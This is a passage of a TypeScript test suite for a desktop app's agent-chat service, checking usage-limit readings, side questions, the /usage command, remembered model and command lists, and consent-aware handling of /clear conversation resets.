      /** An answer with the per-model section, as one from the endpoint has. */
      const fromEndpoint = (): void => {
        usageAnswer = () =>
          Promise.resolve({
            ...USAGE_RESPONSE,
            rate_limits: { ...USAGE_RESPONSE.rate_limits, model_scoped: [] }
          })
      }

      it('says when the copy the CLI answered from was made', async () => {
        fromEndpoint()
        const asOf = await cached(30 * 60_000)
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBe(asOf)
      })

      it('says nothing about a copy young enough to be a live read', async () => {
        fromEndpoint()
        await cached(60_000)
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBeNull()
      })

      // A machine that has never run the CLI has no file, and a gauge's
      // footnote is no reason to fail the gauge.
      it('says nothing when the CLI has left nothing to read', async () => {
        fromEndpoint()
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBeNull()
      })

      /*
       * An answer with no per-model section was built from the headers of the
       * session's last model response, so the file says nothing about it — the
       * moment is when that response came.
       */
      it('dates a figure built from headers by the last model response', async () => {
        await cached(5 * 60_000)
        let clock = '2026-08-12T10:00:00.000Z'
        const { service, workspaceId } = await withWorkspace({ now: () => clock })
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        agent().emit(textMessage('thinking out loud'))
        await vi.waitFor(async () => {
          expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
        })
        clock = '2026-08-12T10:40:00.000Z'

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBe('2026-08-12T10:00:00.000Z')
      })

      it('says nothing of headers that are minutes old', async () => {
        let clock = '2026-08-12T10:00:00.000Z'
        const { service, workspaceId } = await withWorkspace({ now: () => clock })
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        agent().emit(textMessage('thinking out loud'))
        await vi.waitFor(async () => {
          expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
        })
        clock = '2026-08-12T10:02:00.000Z'

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBeNull()
      })

      // A session that has only announced itself has heard nothing from the
      // model, so there is no headers moment to date anything by.
      it('does not count a session that has not heard from the model', async () => {
        let clock = '2026-08-12T10:00:00.000Z'
        const { service, workspaceId } = await withWorkspace({ now: () => clock })
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')

        agent().emit(initMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
        })
        clock = '2026-08-12T10:40:00.000Z'

        await service.refreshSubscriptionUsage()

        expect(service.getUsageWindows()?.asOf).toBeNull()
      })

      // Typed `/usage` fills the block as well, and its answer is as old as any.
      it('dates what a typed /usage kept just the same', async () => {
        fromEndpoint()
        const asOf = await cached(45 * 60_000)
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)

        await service.sendToChat(chat.id, '/usage')

        expect(service.getUsageWindows()?.asOf).toBe(asOf)
      })
    })

    // An API-key, Bedrock or Vertex session. A different sentence from "not
    // read yet", because no amount of pressing changes it.
    it('says when the account has no plan windows at all', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      usageAnswer = () =>
        Promise.resolve({ ...USAGE_RESPONSE, rate_limits_available: false, rate_limits: null })

      await expect(service.refreshSubscriptionUsage()).resolves.toEqual({ kind: 'noPlan' })
    })

    /*
     * The press used to report success here and hand back the previous figures,
     * so a read that never happened redrew a stale number as though it were
     * fresh.
     */
    it('says when the read failed rather than answering with the old figures', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.refreshSubscriptionUsage()

      usageAnswer = () => Promise.reject(new Error('unknown control request'))

      await expect(service.refreshSubscriptionUsage()).resolves.toEqual({ kind: 'failed' })
      expect(share(service.getUsageWindows(), 'five_hour')).toBe(18)
    })

    /*
     * The reading is taken when a turn ends, by the service that knows a turn
     * ended — not by whichever pane happens to be mounted, which is where it
     * used to live. A workspace with no chat pane open refreshed nothing, and
     * the sidebar read a cache the pane was still filling, so the block drew
     * the previous turn's figure on every turn.
     */
    it('reads the account when a turn ends, with nothing else asking', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(share(service.getUsageWindows(), 'five_hour')).toBe(18)
      })
    })

    /*
     * `/usage` asks for everything and the answer carries these two windows, so
     * a command somebody typed fills the sidebar without a second request. The
     * app was reading them and throwing them away for that purpose.
     */
    it('keeps the windows a typed /usage already asked for', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/usage')

      expect(service.getUsageWindows()).not.toBeNull()
    })

    // Nothing is asked of the agent for this: the sidebar has no chat, and the
    // figures belong to the account rather than to any conversation.
    it('answers the account reading with no chat in the question', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.refreshSubscriptionUsage()

      expect(share(service.getUsageWindows(), 'five_hour')).toBe(18)
    })

    /*
     * Every window the answer carried, not two of them. The block used to keep
     * `five_hour` and `seven_day` and drop the rest — so an account with a
     * weekly window per model had it named by the `/usage` card and not by the
     * sidebar, out of one and the same reading.
     */
    it('keeps every window the account reported', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.refreshSubscriptionUsage()

      expect(service.getUsageWindows()?.limits.map((window) => window.key)).toEqual([
        'five_hour',
        'seven_day'
      ])
    })
  })

  describe('a side question', () => {
    it('is answered by the running session, beside the conversation', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      const before = events.length
      const history = [{ question: 'what is x?', response: 'a flag' }]

      await expect(service.askSideQuestion(chat.id, 'and y?', history)).resolves.toEqual({
        text: 'It is a flag.',
        synthetic: false
      })

      expect(agents).toHaveLength(1)
      const [[question, options]] = agent().sideAsks() as [[string, Record<string, unknown>]]
      expect(question).toBe('and y?')
      expect(options.history).toEqual(history)
      expect(options.signal).toBeInstanceOf(AbortSignal)
      expect(agent().sent).toEqual(['work'])
      expect(events.slice(before)).toEqual([])
      expect(await service.chatHistory(chat.id)).toHaveLength(1)
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    it('starts a session for it when none is running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.askSideQuestion(chat.id, 'what is this repo?', [])

      expect(agents).toHaveLength(1)
      expect(agent().sent).toEqual([])
      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
    })

    it('answers nothing when the agent had nothing to say', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      sideAnswer = () => Promise.resolve(null)

      await expect(service.askSideQuestion(chat.id, 'q', [])).resolves.toBeNull()
    })

    it('names an agent that cannot answer side questions at all', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      sideAnswer = null

      await expect(service.askSideQuestion(chat.id, 'q', [])).rejects.toMatchObject({
        code: 'sideQuestionUnsupported'
      })
    })

    it('carries the reason when the request itself fails', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      sideAnswer = () => Promise.reject(new Error('transport closed'))

      await expect(service.askSideQuestion(chat.id, 'q', [])).rejects.toMatchObject({
        code: 'sideQuestionFailed',
        params: { reason: 'transport closed' }
      })
    })

    // The SDK rejects an aborted request with the DOMException's English text.
    it('says it timed out rather than passing the abort text on', async () => {
      const { service, workspaceId } = await withWorkspace({ sideQuestionTimeoutMs: 10 })
      const chat = await service.openChat(workspaceId)
      sideAnswer = () =>
        new Promise((_resolve, reject) => {
          setTimeout(() => {
            reject(new Error('The operation was aborted due to timeout'))
          }, 30)
        })

      await expect(service.askSideQuestion(chat.id, 'q', [])).rejects.toMatchObject({
        code: 'sideQuestionTimedOut'
      })
    })

    it('refuses a /btw sent as an ordinary message, so it never queues', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await expect(service.sendToChat(chat.id, '/btw why?')).rejects.toThrow('askSideQuestion')
      expect(agents).toHaveLength(0)
      expect(await service.chatHistory(chat.id)).toEqual([])
    })
  })

  describe('the /usage command', () => {
    it('answers with a report instead of passing the message on', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/usage')

      // Not forwarded: the CLI would answer the same question in prose, and
      // the paragraph would land underneath the card.
      expect(agents[0]?.sent).toEqual([])
      expect(events.at(-1)?.event).toMatchObject({
        type: 'usage',
        report: { subscriptionType: 'max', limitsApply: true }
      })
    })

    it('recognises the command under an alias the agent reported', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      offeredCommands = () =>
        Promise.resolve([
          { name: 'usage', description: '', aliases: ['cost'] } as unknown as SlashCommand
        ])
      const chat = await service.openChat(workspaceId)

      // The list is only learned once a session has run, so the first message
      // teaches it and the second is the one under test.
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.knownCommands).toHaveLength(1)
      })

      await service.sendToChat(chat.id, '/cost')

      expect(agents[0]?.sent).toEqual(['work'])
      expect(events.at(-1)?.event).toMatchObject({ type: 'usage' })
    })

    it('keeps the question and the answer in the transcript', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/usage')

      // Both halves. A log that kept the command and dropped what it returned
      // would be worse read back than one that kept neither.
      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history.map((entry) => entry.role)).toEqual(['user', 'agent'])
        // Read back through `AgentEventSchema`, so this is also the round trip:
        // a report the stored schema could not parse would take the whole entry
        // with it, and the card would come back empty on the next launch.
        expect(history[1]).toMatchObject({
          event: { type: 'usage', report: { subscriptionType: 'max', limitsApply: true } }
        })
      })
    })

    // Nothing went to the agent, so no `result` is coming to put the status
    // back. Left on `running`, the conversation would claim to be working for
    // the rest of its life.
    it('leaves the conversation idle', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/usage')

      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
    })

    it('still answers when the reading fails', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      usageAnswer = () => Promise.reject(new Error('unknown control request'))
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/usage')

      // Silence under a `/usage` bubble reads as a hang. The card says the
      // reading is unavailable instead.
      expect(events.at(-1)?.event).toEqual({ type: 'usage', report: null })
    })

    /*
     * A reachable state, and not a corner: the composer is deliberately not
     * disabled while the agent works (`docs/ui.md`), so this is one stray
     * `/usage` away at any moment. The turn must survive it — nothing is sent,
     * so there is nothing to interrupt, and the status belongs to the turn
     * rather than to the command.
     */
    it('answers mid-turn without disturbing the turn', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.sendToChat(chat.id, '/usage')

      expect(agents[0]?.sent).toEqual(['work'])
      expect(agents[0]?.interrupted()).toBe(0)
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      expect(events.at(-1)?.event).toMatchObject({ type: 'usage' })
    })

    // `sessionUsage` refuses to start a session to fill a gauge, and rightly.
    // This is the other case: somebody typed a command and is owed an answer.
    it('starts a session when the conversation has never run one', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      expect(agents).toHaveLength(0)

      await service.sendToChat(chat.id, '/usage')

      expect(agents).toHaveLength(1)
    })
  })

  describe('the models the account may use', () => {
    const OPUS: ModelInfo = { value: 'claude-opus-5', displayName: 'Opus 5', description: '' }

    it('knows none until a session has run', async () => {
      const { service } = await withWorkspace()

      expect(service.knownModels()).toEqual([])
    })

    // The agent can only be asked while a session is open, so the list is
    // remembered — otherwise the picker would be empty until the first message,
    // which is exactly when the choice matters most.
    it('remembers what the agent reported when a session started', async () => {
      const { service, workspaceId } = await withWorkspace()
      offered = () => Promise.resolve([OPUS])
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      await vi.waitFor(() => {
        expect(service.knownModels()).toHaveLength(1)
      })
      expect(service.knownModels()[0]?.displayName).toBe('Opus 5')
    })

    it('keeps the list across a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      offered = () => Promise.resolve([OPUS])
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await vi.waitFor(() => {
        expect(service.knownModels()).toHaveLength(1)
      })

      const restarted = await createService({ ...paths(dir), query: fakeQuery() })

      expect(restarted.knownModels()[0]?.value).toBe('claude-opus-5')
    })

    // Starting a session is not a reason to write to disk. Every message after
    // the first would otherwise rewrite the same list back over itself.
    it('writes nothing when the list has not changed', async () => {
      const { service, workspaceId } = await withWorkspace()
      offered = () => Promise.resolve([OPUS])
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await vi.waitFor(() => {
        expect(service.knownModels()).toHaveLength(1)
      })

      const before = await readFile(join(dir, 'state.json'), 'utf8')
      await service.interruptChat(chat.id)
      await service.sendToChat(chat.id, 'again')

      await expect(readFile(join(dir, 'state.json'), 'utf8')).resolves.toBe(before)
    })

    /*
     * The other half of the same fire-and-forget, and it used to have nobody
     * to catch it: only the read was guarded, so a list that arrived and could
     * not be written left an uncaught rejection in the main process — which
     * Electron shows as a modal about a JavaScript error, over an application
     * that is otherwise fine.
     *
     * The answer is held until the state file is unwritable, or it lands
     * before there is anything to fail against.
     */
    it('reports a list that cannot be written instead of leaving it to the process', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      let release: (models: ModelInfo[]) => void = () => undefined
      offered = () =>
        new Promise<ModelInfo[]>((resolve) => {
          release = resolve
        })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      // The state file becomes a directory, so the rename that finishes an
      // atomic write has nowhere to land.
      await rm(join(dir, 'state.json'), { force: true })
      await mkdir(join(dir, 'state.json'), { recursive: true })
      release([OPUS])

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'error')).toBe(true)
      })
    })

    // The list is a convenience. A message must not fail because the names of
    // the models could not be read — the session itself already reports its own
    // failures through the event stream.
    it('sends the message anyway when the models cannot be read', async () => {
      const { service, workspaceId } = await withWorkspace()
      offered = () => Promise.reject(new Error('no such control request'))
      const chat = await service.openChat(workspaceId)

      await expect(service.sendToChat(chat.id, 'work')).resolves.toEqual(expect.any(String))
      expect(service.knownModels()).toEqual([])
    })
  })

  /*
   * Kept per chat rather than per account, unlike the models above: a project's
   * own commands live in its `.claude/commands/`, so the answer is about this
   * worktree and this branch.
   */
  /*
   * The `@` list. Kept per chat for the reason the commands are: a project's
   * own agents live in its `.claude/agents/`.
   */
  describe('the subagents a chat may mention', () => {
    it('knows none until a session has run', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      expect(service.chatAgents(chat.id)).toEqual([])
    })

    it('remembers what the agent reported when a session started, across a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredAgents = () =>
        Promise.resolve([{ name: 'Explore', description: 'Searches the code', model: 'haiku' }])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)

      await vi.waitFor(() => {
        expect(service.chatAgents(chat.id)).toEqual([
          { name: 'Explore', description: 'Searches the code' }
        ])
      })

      const reopened = await createService({ ...paths(dir), query: fakeQuery() })
      expect(reopened.chatAgents(chat.id)).toEqual([
        { name: 'Explore', description: 'Searches the code' }
      ])
    })

    // A convenience missing is not a failure: the message has gone, and the
    // list stays as it was rather than claiming there are no agents.
    it('keeps what it knew when the agents cannot be read', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      offeredCommands = () =>
        Promise.resolve([{ name: 'deploy', description: '', argumentHint: '' }])
      offeredAgents = () => Promise.reject(new Error('no such control request'))
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      // The commands arriving is what says the lists were asked for at all.
      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })

      expect(service.chatAgents(chat.id)).toEqual([])
      expect(events.map((announced) => announced.event.type)).not.toContain('error')
    })
  })

  describe('the commands a chat may use', () => {
    const DEPLOY: SlashCommand = {
      name: 'deploy',
      description: 'Ship it',
      argumentHint: '<env>'
    }

    it('knows none until a session has run', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      expect(service.chatCommands(chat.id)).toEqual([])
    })

    it('remembers what the agent reported when a session started', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () => Promise.resolve([DEPLOY])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)

      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })
      expect(service.chatCommands(chat.id)[0]).toEqual({
        name: 'deploy',
        description: 'Ship it',
        argumentHint: '<env>',
        aliases: [],
        skill: false
      })
    })

    it('keeps the list across a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () => Promise.resolve([DEPLOY])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })

      const reopened = await createService({ ...paths(dir), query: fakeQuery() })
      expect(reopened.chatCommands(chat.id)).toHaveLength(1)
    })

    // Asked on every session start, so a chat reopened a hundred times must not
    // rewrite the state file a hundred times to say the same thing.
    it('writes nothing when the list has not changed', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () => Promise.resolve([DEPLOY])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })

      const before = await readFile(join(dir, 'state.json'), 'utf8')
      await service.sendToChat(chat.id, 'more work')
      await vi.waitFor(() => {
        expect(agents).toHaveLength(1)
      })

      expect(await readFile(join(dir, 'state.json'), 'utf8')).toBe(before)
    })

    // The SDK pushes the whole list and says to replace the cached one, so a
    // command withdrawn upstream has to leave rather than linger.
    it('replaces the list outright when the agent announces a new one', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () => Promise.resolve([DEPLOY])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })

      agent().emit({
        type: 'system',
        subtype: 'commands_changed',
        commands: [{ name: 'rollback', description: '', argumentHint: '' }]
      } as unknown as SDKMessage)

      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id).map((command) => command.name)).toEqual(['rollback'])
      })
    })

    // A session goes on emitting for a moment after its workspace has been
    // removed. The list has nowhere to be written by then, and writing it
    // would put a chat back into a state that no longer holds one.
    it('writes nothing for a chat whose workspace has gone', async () => {
      const { service, workspaceId, projectId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      const session = agent()
      await service.removeWorkspaceById(workspaceId, { force: true })

      session.emit({
        type: 'system',
        subtype: 'commands_changed',
        commands: [{ name: 'deploy', description: '', argumentHint: '' }]
      } as unknown as SDKMessage)

      // Queues behind the write that event started, so awaiting it means that
      // one has finished — and the assertion is about a settled state rather
      // than a race.
      const other = await service.createWorkspaceIn(projectId)

      expect(service.listChats(workspaceId)).toEqual([])
      expect(service.listChats(other.id)).toEqual([])
    })

    // A list that cannot be read is a lost convenience, not a lost message:
    // failing the send over it would report the wrong problem entirely.
    it('sends the message even when the list cannot be read', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () => Promise.reject(new Error('no such control request'))

      const chat = await service.openChat(workspaceId)

      await expect(service.sendToChat(chat.id, 'work')).resolves.toEqual(expect.any(String))
      expect(service.chatCommands(chat.id)).toEqual([])
    })
  })

  /*
   * Clearing is the one command whose consequences reach outside the agent, so
   * it is the one with tests of its own.
   *
   * The reset the SDK sends back is not proof of consent: the same message
   * arrives when the agent leaves plan mode. Everything here turns on the
   * difference between a reset the user asked for and one that merely happened.
   */
  describe('a conversation cleared', () => {
    const resetMessage = {
      type: 'conversation_reset',
      new_conversation_id: 'conv-2',
      session_id: 'sess-1'
    } as unknown as SDKMessage

    /** Sends `text`, then has the agent answer with a reset. */
    async function sendAndReset(
      service: OctopusService,
      chatId: string,
      text: string
    ): Promise<void> {
      await service.sendToChat(chatId, text)
      agent().emit(resetMessage)
    }

    it('throws away the transcript when the user asked for it', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'remember this')
      agent().emit(textMessage('noted'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
      })

      await sendAndReset(service, chat.id, '/clear')

      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).toEqual([])
      })
    })

    /*
     * Reported from a running app: `/clear` emptied the pane and left one row
     * at the top of it reading `0.1s · 0 tokens` — the footer of the turn that
     * ran the command, arriving after the log it belonged to was thrown away.
     *
     * The transcript is discarded the moment the reset says it was asked for,
     * and the result lands a tick later, recreating the file to hold a footer
     * for a turn nobody can see. It survived a restart, so clearing twice was
     * the only way to be rid of it — and that left a new one.
     */
    it('keeps the footer of the clearing turn out of the fresh transcript', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, '/clear')
      agent().emit(resultMessage)
      // Something that came after it, to wait on. Waiting on the absence
      // itself is what the first draft of this test did, and it passed against
      // the bug: the writes are background, so an empty file satisfies "no
      // result yet" on the first poll. Once a later event is in the file, so is
      // anything earlier that was ever going to be.
      agent().emit(textMessage('and now something else'))

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history.some((entry) => entry.role === 'agent' && entry.event.type === 'text')).toBe(
          true
        )
      })

      const history = await service.chatHistory(chat.id)
      expect(history.some((entry) => entry.role === 'agent' && entry.event.type === 'result')).toBe(
        false
      )
    })

    // The announcement still goes out, unlike the record: it is what stops the
    // composer offering to stop, and a turn that cannot be ended is worse than
    // a footer that says nothing.
    it('still tells the window the turn has ended', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, '/clear')
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(events.some((announced) => announced.event.type === 'result')).toBe(true)
      })
    })

    // The flag belongs to one turn. Left standing it would swallow the footer
    // of the next one — the first turn since the clear with anything to report.
    it('keeps the footer of the turn after it', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, '/clear')
      agent().emit(resultMessage)

      await service.sendToChat(chat.id, 'now do something')
      agent().emit(resultMessage)
      // The marker again: "exactly one" is satisfied by the first of two the
      // moment it lands, so without something later to wait on this passes
      // against a flag that swallowed nothing.
      agent().emit(textMessage('finished'))

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history.some((entry) => entry.role === 'agent' && entry.event.type === 'text')).toBe(
          true
        )
      })

      const history = await service.chatHistory(chat.id)
      expect(
        history.filter((entry) => entry.role === 'agent' && entry.event.type === 'result')
      ).toHaveLength(1)
    })

    it('tells the window the log is to go with it', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, '/clear')

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'conversation_reset',
          cleared: true
        })
      })
    })

    /*
     * The bug this prevents: leaving plan mode also resets the conversation,
     * so a reset read as consent would erase the whole log every time a plan
     * was approved — including the plan itself.
     */
    it('keeps the transcript when nobody asked, and marks the boundary', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, 'get on with it')

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'conversation_reset',
          cleared: false
        })
      })

      const history = await service.chatHistory(chat.id)
      expect(
        history.some((entry) => entry.role === 'user' && entry.text === 'get on with it')
      ).toBe(true)
      expect(
        history.some((entry) => entry.role === 'agent' && entry.event.type === 'conversation_reset')
      ).toBe(true)
    })

    // A request with no session to send it to — a start that failed, or one a
    // close refused — has no reset coming. Kept, it waited for the next one the
    // agent sent of its own accord, on leaving plan mode, and erased the log.
    it('keeps no request whose message never reached the agent', async () => {
      let failing = true
      const { service, workspaceId, events } = await withWorkspace({
        windowOverride: () =>
          failing ? Promise.reject(new Error('settings unreadable')) : Promise.resolve(null)
      })
      const chat = await service.openChat(workspaceId)
      await expect(service.sendToChat(chat.id, '/clear')).rejects.toThrow('settings unreadable')

      failing = false
      await sendAndReset(service, chat.id, 'get on with it')

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'conversation_reset',
          cleared: false
        })
      })
    })

    // A request belongs to the reset it caused. Left behind, it would clear the
    // log the next time the agent reset the conversation for its own reasons.
    it('does not let one request clear a second time', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await sendAndReset(service, chat.id, '/clear')
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).toEqual([])
      })

      await sendAndReset(service, chat.id, 'carry on')

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history.some((entry) => entry.role === 'user' && entry.text === 'carry on')).toBe(
          true
        )
      })
    })

    /*
     * A newer CLI says what caused the reset, and that outranks the guess made
     * from what was sent: a /clear the chat did not recognise still clears,
     * and a request still waiting is not spent on another flow's reset.
     */
    it('clears when the agent says the reset came from /clear', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'remember this')
      agent().emit(textMessage('noted'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
      })

      agent().emit({ ...resetMessage, trigger: 'clear' } as unknown as SDKMessage)

      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).toEqual([])
      })
    })

    it('keeps a waiting /clear for its own reset when another flow resets first', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, '/clear')
      agent().emit({ ...resetMessage, trigger: 'plan_mode_exit' } as unknown as SDKMessage)
      agent().emit(resetMessage)

      await vi.waitFor(() => {
        expect(
          events
            .map((announced) => announced.event)
            .filter((event) => event.type === 'conversation_reset')
        ).toEqual([
          { type: 'conversation_reset', cleared: false, trigger: 'plan_mode_exit' },
          { type: 'conversation_reset', cleared: true }
        ])
      })
    })

    // Discarding happens in the background, so a failure has nowhere to be
    // thrown. Reported into the chat instead — the same treatment a failed
    // append gets, and the alternative is an uncaught rejection in the main
    // process, which Electron turns into a modal.
    it('reports a transcript it could not throw away', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, '/clear')

      // A directory where the file should be: `rm` without `recursive` refuses
      // it, which is the closest thing to a disk that will not let go.
      const transcript = join(dir, 'data', 'chats', `${chat.id}.jsonl`)
      await rm(transcript, { force: true })
      await mkdir(join(transcript, 'in the way'), { recursive: true })

      agent().emit(resetMessage)

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event.type)).toContain('error')
      })
    })

    // Aliases are the agent's own: `/reset` and `/new` reach the same command,
    // and the chat is where that list is kept.
    it('recognises the command by an alias the agent reported', async () => {
      const { service, workspaceId } = await withWorkspace()
      offeredCommands = () =>
        Promise.resolve([{ name: 'clear', description: '', argumentHint: '', aliases: ['reset'] }])

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      // The session announces its lists once its first init has arrived.
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.chatCommands(chat.id)).toHaveLength(1)
      })

      agent().emit(textMessage('noted'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
      })

      await sendAndReset(service, chat.id, '/reset')

      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).toEqual([])
      })
    })
  })

  describe('the record', () => {
    // A workspace nobody has spoken to gets no record and no transcript file,
    // so the state stays a description of what happened rather than of what might.
    it('does not exist until someone writes', async () => {
      const { service, workspaceId } = await withWorkspace()

      expect(service.listChats(workspaceId)).toEqual([])
    })

    it('is created on demand and then reused', async () => {
